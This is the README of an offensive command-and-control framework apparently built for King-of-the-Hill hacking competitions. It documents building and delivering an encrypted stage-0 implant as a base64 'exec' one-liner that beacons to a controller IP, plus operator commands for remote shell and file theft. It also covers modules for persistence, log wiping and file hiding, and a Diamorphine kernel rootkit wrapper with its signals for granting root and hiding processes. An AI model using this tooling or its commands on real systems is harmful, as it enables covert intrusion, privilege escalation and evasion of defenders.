# MX:// BLACKWALL C2 // STAGE-0

> *"The code behind me has begun to permeate the physical world."*

Modular HTTPS control plane for the KOTH battle station. It replaces the
"drop one monolithic binary and hope" model with a tiny stage-0 implant and
on-demand modules.

## Why

Two problems with the original `king/` flow:

1. **The channel** was a bind shell on a known port. KOTH networks usually
   have a route, and a plaintext bind port is trivial to find, hijack or
   firewall.
2. **The payload** was everything at once: persistence, hiding, wall, troll,
   capture. That is a huge binary and a gift for reversers, EDR and a
   competitor with `strings`.

This directory fixes both:

* HTTPS with a pinned self-signed certificate and TLS 1.2+.
* Every request is HMAC-SHA256 signed with a timestamp and a nonce
  (replay-protected, clock-skew checked).
* Modules are sealed with an authenticated HMAC-SHA256 stream and executed
  from memory (`/bin/sh -s`, `python3 -`, or a `memfd` ELF). Nothing is
  written to disk unless a module explicitly does it.
* Stage-0 only preloads a small start set (`recon` by default). Everything
  else is pushed from the operator CLI.
* Optional mTLS (client certificate signed by the same pinned CA).

## Files

```
king/c2/
├── c2_common.py      shared crypto, signing, nonce cache, JSON helpers
├── c2_pack.py        PKI + secrets + module sealing + stage-0 rendering
├── c2_server.py      HTTPS listener, task queue, loot, admin API
├── c2_ctl.py         operator CLI
├── c2_implant.py     stage-0 template (embedded config marker)
└── modules/
    ├── recon.sh      host inventory, users, net, persistence, flags
    ├── persist.sh    tiny HTTPS loader + cron/systemd/rc.local/profile.d
    ├── shadow.sh     ring-3 hiding (ld.so.preload), PATH wrappers, log wipe
    ├── wall.sh       credential rotation, authorized_keys, iptables
    ├── capture.sh    KOTH claim request
    ├── troll.sh      reversible tooling degradation
    └── diamorphine.sh Diamorphine LKM build/load/hide/give-root wrapper
```

Artifacts live in `artifacts/c2/` (git-ignored):

```
artifacts/c2/
├── certs/          server.crt, server.key, optional client.crt/key
├── modules/        <name>.bwm (sealed blobs)
├── stage/          stage0.py, stage0.b64, deploy.txt
├── state/          state.json, c2.log
├── loot/           files pulled with the download task
├── secrets.json    implant + admin secrets (0600)
├── operator.json   admin URL/secret/CA (0600)
├── config.json     public build metadata
└── server.json     server defaults
```

## Quick start

```bash
# 1. build PKI + seal modules + render stage-0
sudo ./blackwall.sh -X build -q --c2-host 10.10.14.7 --c2-port 8443

# 2. start the listener (foreground; use tmux/screen on the controller)
sudo ./blackwall.sh -X server -q --c2-host 10.10.14.7 --c2-port 8443

# 3. deliver stage-0 to the hill (one line, no file on disk)
cat artifacts/c2/stage/deploy.txt

# 4. operate
./blackwall.sh -X ctl -- sessions
./blackwall.sh -X ctl -- shell s-1a2b3c4d 'id; hostname'
./blackwall.sh -X ctl -- module s-1a2b3c4d recon
./blackwall.sh -X ctl -- module s-1a2b3c4d persist
./blackwall.sh -X ctl -- module s-1a2b3c4d diamorphine
```

`deploy.txt` contains a zlib+base64 one-liner:

```bash
python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('...')))"
```

Stage-0 is ~25 KB raw (~10 KB delivered). It contains the CA certificate and
the implant secret; TLS pinning and HMAC still protect the channel if the
binary is reversed on the hill.

## What's new in this build

* **Modular stage-0**: only the start set is preloaded; everything else is
  pushed on demand or registered at runtime with `add-module`.
* **Secret scoping**: modules get `BW_SECRET_B64`, `BW_CA_PEM_B64` and
  `BW_FINGERPRINT` only when they declare `# SECRET: 1` (the `persist`
  module does). `recon` filters all `BW_*` variables from its `env` dump.
* **Hidden artefact root**: by default `BW_PREFIX_DIR=/usr/local/sbin/blk_kit`;
  the `blk_` Diamorphine prefix hides the whole directory after load.
* **mTLS** with a client certificate signed by the pinned CA. The server
  certificate carries `serverAuth,clientAuth` EKU so it can act as the CA
  for the implant certificate.
* **Runtime modules** and `add-module` (sealed server-side, no rebuild).
* **Diamorphine wrapper** with `build / load / build-load / status / unload /
  hide-pid / give-root / toggle`.
* **Theme**: C2 banners, coloured `[C2]`, AI quotes at the end of build,
  server startup/shutdown, stage output and the `-B` audit.
* **`-B` fix**: the quick-audit bottom border used an undefined `${TXT_}`
  variable; it is now `${TXT_VOID}` and a closing quote is printed.

## Build and runtime flags

| Flag | Meaning |
| :--- | :--- |
| `-X build` | mint PKI, rotate secrets, seal modules, render stage-0 |
| `-X server` | run the HTTPS listener |
| `-X ctl` | operator CLI (everything after `--` is passed through) |
| `-X fingerprint` | print the pinned fingerprint and URL |
| `-X deploy` / `-X stage` | build and print delivery instructions |
| `--c2-host <IP>` | controller address reachable from the hill |
| `--c2-port <PORT>` | listener port (8443) |
| `--c2-bind <IP>` | bind address (0.0.0.0) |
| `--c2-url <URL>` | full public URL, overrides host/port |
| `--c2-start <LIST>` | comma-separated modules queued on first register |
| `--c2-poll <SEC>` / `--c2-jitter <SEC>` | beacon interval and jitter |
| `--c2-env K=V` | inject module environment at build time (repeatable) |
| `--c2-allow-ip <IP>` | `BW_ALLOW_IP` for wall/C2 port pinning |
| `--c2-mtls` | require a client certificate |
| `--c2-force` | rotate PKI and secrets |
| `--c2-dry-run` | modules receive `BW_DRY_RUN=1`; prefix dir goes to `/tmp` |

## Operator CLI

```bash
./blackwall.sh -X ctl -- <command>
```

| Command | Meaning |
| :--- | :--- |
| `sessions` | list sessions, age, host, user, uid, IP, queue depth |
| `show <sid>` | session detail and its task list |
| `shell <sid> <cmd...>` | run `/bin/sh -c`, wait for stdout/stderr/rc |
| `module <sid> <name> [args...]` | fetch, decrypt and run a sealed module |
| `upload <sid> <local> <remote>` | base64 upload (8 MiB cap) |
| `download <sid> <remote> [local]` | pull a file; also stored in `loot/` |
| `tasks [sid]` | task queue |
| `wait <tid>` | wait for a task |
| `kill <sid>` | queue an `exit` task |
| `modules` | list sealed modules and metadata |
| `add-module <file> [--name N]` | seal and register a new module at runtime |
| `loot [sid]` | list pulled files |
| `events` | server event ring |
| `note <sid> <text>` | attach an operator note |
| `ping` | server health |
| `stage` | print the delivery instructions |

Common options: `--json`, `--wait <seconds>`, `--no-wait`. They belong to the
subcommand: `./blackwall.sh -X ctl -- sessions --json`.

## Task kinds

| Kind | Payload | Result |
| :--- | :--- | :--- |
| `shell` | `{"cmd": "...", "timeout": 30}` | stdout/stderr/rc/duration |
| `module` | `{"name": "...", "args": "..."}` | module stdout/stderr/rc |
| `upload` | `{"path": "...", "b64": "...", "mode": "600"}` | bytes written |
| `download` | `{"path": "...", "max": 4194304}` | file metadata + b64 |
| `list` | `{"path": "..."}` | directory entries |
| `sleep` | `{"seconds": 30}` | pause |
| `exit` | `{}` | implant stops |

Modules receive `BW_SESSION`, `BW_SERVER`, `BW_TASK`, `BW_MODULE`,
`BW_MODULE_ARGS`, `BW_PREFIX`, `BW_DRY_RUN`, `BW_STAGE_URL`, plus any
`--c2-env` values embedded at build time. By default
`BW_PREFIX_DIR=/usr/local/sbin/blk_kit`, which the `blk_` LKM prefix hides.
Modules that declare `# SECRET: 1` (`persist` does) additionally receive
`BW_SECRET_B64`, `BW_CA_PEM_B64` and `BW_FINGERPRINT`.

## Writing a module

A module is a shell script, Python script or ELF. The first lines can declare
metadata:

```sh
#!/bin/sh
# DESC: what this module does
# REQ: root, python3
# SECRET: 1          # only if it needs BW_SECRET_B64 / BW_CA_PEM_B64
```

The server parses `DESC`, `REQ` and `SECRET` when sealing the module. Modules
are fed to `/bin/sh -s`, `python3 -` or a `memfd`; they do not need a
shebang, but it selects the interpreter for shell modules (`bash` vs `sh`).
Use `BW_DRY_RUN=1` for destructive paths and `BW_PREFIX_DIR` for artefacts.

## Modular loading

The start set is decided at build time:

```bash
sudo ./blackwall.sh -X build -q --c2-host 10.10.14.7 --c2-start recon
```

When a new session registers, the server queues those modules as normal
tasks. Later modules are pushed by the operator:

```bash
./blackwall.sh -X ctl -- module s-1a2b3c4d shadow
./blackwall.sh -X ctl -- module s-1a2b3c4d wall 'BW_FIREWALL=1'
```

Runtime modules can be added without rebuilding stage-0:

```bash
./blackwall.sh -X ctl -- add-module ./my_module.sh --name mymod --desc "..."
./blackwall.sh -X ctl -- module s-1a2b3c4d mymod
```

The server seals the module with the implant secret and stores it in
`artifacts/c2/modules/`.

## Diamorphine

`diamorphine.sh` is a wrapper, not a vendored copy. Point it at a checkout:

```bash
./blackwall.sh -X ctl -- module s-1a2b3c4d diamorphine \
  'BW_DIA_SRC=/opt/Diamorphine BW_HIDE_PREFIX=blk_'
```

Or let it clone upstream on the hill (opsec: network egress):

```bash
BW_DIA_CLONE=1 BW_HIDE_PREFIX=blk_ ...
```

What it does:

* checks root, `gcc`, `make`, matching kernel headers;
* patches `MAGIC_PREFIX` to `BW_HIDE_PREFIX` (default `blk_`);
* builds and `insmod`s the module;
* installs `/lib/modules/<ver>/kernel/drivers/blk/blk_dia.ko` and
  `/etc/modules-load.d/blk_dia.conf` for boot persistence;
* records a marker (`blk_dia`) so other modules can detect it;
* supports `BW_DIA_ACTION=status|unload|hide-pid|give-root|toggle`.

Diamorphine hides every file/directory whose name starts with the magic
prefix and exposes process control through signals (upstream defaults):

| Signal | Action |
| :---: | :--- |
| `kill -63 <pid>` | toggle process invisibility |
| `kill -64 <pid>` | give root to a process |
| `kill -31 <pid>` | toggle module visibility |

The C2 modules use the `blk_` prefix for their artefacts, so the LKM hides
them after load. `shadow.sh` also compiles `blk_hide.so` for ring-3 hiding
if the LKM is not an option.

**Risk:** a kernel module is ring-0. A mismatch, Secure Boot, signed-module
enforcement, or a bad build can panic the hill and lose the round. Always
have the ring-3 `shadow` fallback. The module refuses to build without
headers and prints the failure instead of guessing.

## Security model

* **Transport:** TLS 1.2+ with `ECDHE+AESGCM`/`CHACHA20`, no compression.
* **Server authentication:** the server certificate is pinned as a CA
  (`load_verify_locations(cadata=...)`) and by SHA256 fingerprint.
* **Client authentication:** HMAC-SHA256 over method, path, timestamp,
  nonce and body hash. Replay cache with 10-minute TTL; 5-minute skew.
* **Module integrity:** encrypt-then-MAC with HMAC-SHA256 as a PRF stream
  and a 128-bit random nonce. A bad tag aborts before execution.
* **mTLS (optional):** a client certificate signed by the pinned CA. The
  server requires it; the operator CLI reads `client.crt/key` from
  `operator.json`.
* **No plaintext module on disk:** shell/python modules are piped on stdin;
  ELF modules use `memfd_create` + `/proc/self/fd`.
* **Stage-0 secrets:** the implant secret and CA are extracted if the hill
  is fully compromised. Rotate with `--c2-force` between events, and do not
  reuse a build across teams.

The cryptography is deliberately stdlib-only. The stream construction is
HMAC-SHA256 in counter mode plus an HMAC tag, not AES-GCM; it is
authenticated and randomised, but if you need a standard AEAD primitive,
swap `seal`/`unseal` in `c2_common.py` and `c2_implant.py` together.

## Threat model / limits

* The module is a controller-side tool. A competitor with root on the hill
  can read stage-0 memory, the secret, and the module blobs after fetch.
  The rootkit and shadow modules buy time, not absolute secrecy.
* `ld.so.preload` is global. A broken `hide.so` can hide files from the
  checker or break every process. `shadow.sh` self-tests before installing
  and leaves a backup, but test in a snapshot first.
* `wall.sh` can lock you out. `--c2-allow-ip` pins the C2 port to the
  controller; keep SSH/checker ports open.
* Do not attack the checker/health endpoint. The modules only touch the
  service you captured.

## Development / test

```bash
python3 -m py_compile king/c2/*.py
bash -n blackwall.sh king/c2.sh king/c2/modules/*.sh

# fully local test (dry-run modules, no system changes)
python3 king/c2/c2_pack.py build \
  --dir /tmp/bw-c2 --host 127.0.0.1 --port 18443 \
  --start-modules recon --poll 3 --jitter 0 --dry-run \
  --env BW_PREFIX_DIR=/tmp/bw-c2/work

python3 king/c2/c2_server.py --dir /tmp/bw-c2 --bind 127.0.0.1 --port 18443

BW_DEBUG=1 BW_ONESHOT=1 python3 /tmp/bw-c2/stage/stage0.py
python3 king/c2/c2_ctl.py --dir /tmp/bw-c2 sessions
```

`BW_DRY_RUN=1` makes the destructive modules print commands instead of
running them. `BW_PREFIX_DIR` redirects artefacts to a scratch directory.

## Troubleshooting

| Symptom | Cause / fix |
| :--- | :--- |
| `missing certificate/key` | `server.json.key` is a path; run `-X build` after upgrading from an older build |
| `certificate pin mismatch` | stage-0 and server were built with different `--c2-force`; rebuild both |
| `clock skew` | hill clock is off by >5 min; fix NTP or raise `SKEW` |
| `unknown session` / re-register loop | server state was wiped; implant re-registers automatically |
| module `bad tag` | module was sealed with a different secret; rebuild stage-0 and modules together |
| mTLS `unsupported certificate` | server cert needs `clientAuth` EKU; regenerate with `--c2-force --c2-mtls` |
| `ld.so.preload` broke `ls` | remove the `blk_hide.so` line from `/etc/ld.so.preload`; backup is `/etc/blk_preload.bak` |
| Diamorphine build fails | install `linux-headers-$(uname -r)`, check Secure Boot / module signing; fall back to `shadow` |

---

<sub><font color="#ff2244">PROJECT BLACKWALL // CYNOSURE MILITECH ARCHIVES // 2026</font></sub>
